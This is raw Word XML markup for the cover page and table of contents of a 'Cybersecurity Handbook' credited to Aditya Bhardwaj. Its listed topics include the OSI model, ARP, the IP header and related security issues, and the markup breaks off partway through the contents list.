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4780815"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Cover Pages"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="67E0347E" w14:textId="296B20E7" w:rsidR="00D943D1" w:rsidRDefault="00D943D1">
          <w:pPr>
            <w:pStyle w:val="NoSpacing"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
            <mc:AlternateContent>
              <mc:Choice Requires="wpg">
                <w:drawing>
                  <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658242" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1F4AB1AC" wp14:editId="0F8EDC8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3D1B4E" w14:textId="1603E763" w:rsidR="00D943D1" w:rsidRDefault="00D943D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F4AB1AC" id="Group 26" o:spid="_x0000_s1026" style="position:absolute;margin-left:0;margin-top:0;width:172.8pt;height:718.55pt;z-index:-251658238;mso-width-percent:330;mso-height-percent:950;mso-left-percent:40;mso-position-horizontal-relative:page;mso-position-vertical:center;mso-position-vertical-relative:page;mso-width-percent:330;mso-height-percent:950;mso-left-percent:40" coordsize="21945,9125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">
                    <v:rect id="Rectangle 3" o:spid="_x0000_s1027" style="position:absolute;width:1945;height:91257;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" adj="18883" fillcolor="#4f81bd [3204]" stroked="f" strokeweight="2pt">
                      <v:textbox inset=",0,14.4pt,0">
                        <w:txbxContent>
                          <w:p w14:paraId="7A3D1B4E" w14:textId="1603E763" w:rsidR="00D943D1" w:rsidRDefault="00D943D1">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">
                      <v:group id="Group 6" o:spid="_x0000_s1030" style="position:absolute;left:1410;top:42118;width:10478;height:31210" coordorigin="1410,42118" coordsize="10477,312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">
                        <o:lock v:ext="edit" aspectratio="t"/>
                        <v:shape id="Freeform 20" o:spid="_x0000_s1031" style="position:absolute;left:3696;top:62168;width:1937;height:6985;visibility:visible;mso-wrap-style:square;v-text-anchor:top" coordsize="122,4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">
                        <o:lock v:ext="edit" aspectratio="t"/>
                        <v:shape id="Freeform 8" o:spid="_x0000_s1044" style="position:absolute;left:1187;top:51897;width:1984;height:7143;visibility:visible;mso-wrap-style:square;v-text-anchor:top" coordsize="125,4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4" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="76AF77CA" wp14:editId="4493828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243292" w14:textId="653E915F" w:rsidR="00D943D1" w:rsidRPr="00B00F14" w:rsidRDefault="00B00F14">
                                <w:pPr>
                                  <w:pStyle w:val="NoSpacing"/>
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="20"/>
                                    <w:szCs w:val="20"/>
                                    <w:lang w:val="en-IN"/>
                                  </w:rPr>
                                </w:pPr>
                                <w:r>
                                  <w:rPr>
                                    <w:color w:val="4F81BD" w:themeColor="accent1"/>
                                    <w:sz w:val="26"/>
                                    <w:szCs w:val="26"/>
                                    <w:lang w:val="en-IN"/>
                                  </w:rPr>
                                  <w:t>ADITYA BHARDWAJ</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6AF77CA" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                    <v:stroke joinstyle="miter"/>
                    <v:path gradientshapeok="t" o:connecttype="rect"/>
                  </v:shapetype>
                  <v:shape id="Text Box 28" o:spid="_x0000_s1055" type="#_x0000_t202" style="position:absolute;margin-left:0;margin-top:0;width:4in;height:28.8pt;z-index:25165824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" filled="f" stroked="f" strokeweight=".5pt">
                    <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                      <w:txbxContent>
                        <w:p w14:paraId="58243292" w14:textId="653E915F" w:rsidR="00D943D1" w:rsidRPr="00B00F14" w:rsidRDefault="00B00F14">
                          <w:pPr>
                            <w:pStyle w:val="NoSpacing"/>
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="20"/>
                              <w:szCs w:val="20"/>
                              <w:lang w:val="en-IN"/>
                            </w:rPr>
                          </w:pPr>
                          <w:r>
                            <w:rPr>
                              <w:color w:val="4F81BD" w:themeColor="accent1"/>
                              <w:sz w:val="26"/>
                              <w:szCs w:val="26"/>
                              <w:lang w:val="en-IN"/>
                            </w:rPr>
                            <w:t>ADITYA BHARDWAJ</w:t>
                          </w:r>
                        </w:p>
                      </w:txbxContent>
                    </v:textbox>
                    <w10:wrap anchorx="page" anchory="page"/>
                  </v:shape>
                </w:pict>
              </mc:Fallback>
            </mc:AlternateContent>
          </w:r>
          <w:r>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
            <mc:AlternateContent>
              <mc:Choice Requires="wps">
                <w:drawing>
                  <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658243" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6A0388E0" wp14:editId="24A6E1A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0F9F9" w14:textId="7DA38B4C" w:rsidR="00D943D1" w:rsidRDefault="00B12C1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00F14">
                                      <w:rPr>
                                        <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
                                        <w:color w:val="262626" w:themeColor="text1" w:themeTint="D9"/>
                                        <w:sz w:val="72"/>
                                        <w:szCs w:val="72"/>
                                      </w:rPr>
                                      <w:t>Cybersecurity Handbook</w:t>
                                    </w:r>
                                  </w:sdtContent>
                                </w:sdt>
                              </w:p>
                              <w:p w14:paraId="5812B493" w14:textId="07E134AF" w:rsidR="00D943D1" w:rsidRDefault="00D943D1">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A0388E0" id="Text Box 30" o:spid="_x0000_s1056" type="#_x0000_t202" style="position:absolute;margin-left:0;margin-top:0;width:4in;height:84.25pt;z-index:251658243;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" filled="f" stroked="f" strokeweight=".5pt">
                    <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                      <w:txbxContent>
                        <w:p w14:paraId="5CD0F9F9" w14:textId="7DA38B4C" w:rsidR="00D943D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00F14">
                                <w:rPr>
                                  <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
                                  <w:color w:val="262626" w:themeColor="text1" w:themeTint="D9"/>
                                  <w:sz w:val="72"/>
                                  <w:szCs w:val="72"/>
                                </w:rPr>
                                <w:t>Cybersecurity Handbook</w:t>
                              </w:r>
                            </w:sdtContent>
                          </w:sdt>
                        </w:p>
                        <w:p w14:paraId="5812B493" w14:textId="07E134AF" w:rsidR="00D943D1" w:rsidRDefault="00D943D1">
                          <w:pPr>
                            <w:spacing w:before="120"/>
                            <w:rPr>
                              <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                              <w:sz w:val="36"/>
                              <w:szCs w:val="36"/>
                            </w:rPr>
                          </w:pPr>
                        </w:p>
                      </w:txbxContent>
                    </v:textbox>
                    <w10:wrap anchorx="page" anchory="page"/>
                  </v:shape>
                </w:pict>
              </mc:Fallback>
            </mc:AlternateContent>
          </w:r>
        </w:p>
        <w:p w14:paraId="5F8DB340" w14:textId="66F3858E" w:rsidR="00D943D1" w:rsidRDefault="00D943D1">
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
            </w:rPr>
            <w:br w:type="page"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:id w:val="1313296526"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="00E5C20E" w14:textId="2497686C" w:rsidR="004D43F7" w:rsidRDefault="004D43F7">
          <w:pPr>
            <w:pStyle w:val="TOCHeading"/>
          </w:pPr>
          <w:r>
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="2C776BBF" w14:textId="6B25F670" w:rsidR="00F93AFC" w:rsidRDefault="004D43F7">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r>
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc208408471" w:history="1">
            <w:r w:rsidR="00F93AFC" w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>OSI Model:</w:t>
            </w:r>
            <w:r w:rsidR="00F93AFC">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00F93AFC">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00F93AFC">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408471 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00F93AFC">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00F93AFC">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00F93AFC">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidR="00F93AFC">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7C6D3980" w14:textId="11CC4E33" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408472" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protocols used in each layer</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408472 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0543EFC5" w14:textId="7885C243" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408473" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Address Resolution Protocol</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408473 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1A520D3E" w14:textId="7E74EC11" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408474" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How ARP works:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408474 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="58D2D199" w14:textId="702D906A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408475" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of ARP:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408475 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2ABFBEC3" w14:textId="63233A7D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408476" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues &amp; Attacks</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408476 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="19061310" w14:textId="4710926D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408477" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Internet Protocol</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408477 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="19160696" w14:textId="4072A45E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408478" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Main Responsibilities:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408478 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7D075DB0" w14:textId="0BBA7C07" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408479" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>IP Header</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408479 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1EA227CB" w14:textId="5F8998BD" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408480" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408480 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4DDD5E27" w14:textId="17C8DE0F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408481" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues with IP:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408481 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4071DBFA" w14:textId="45B5C4C6" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408482" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
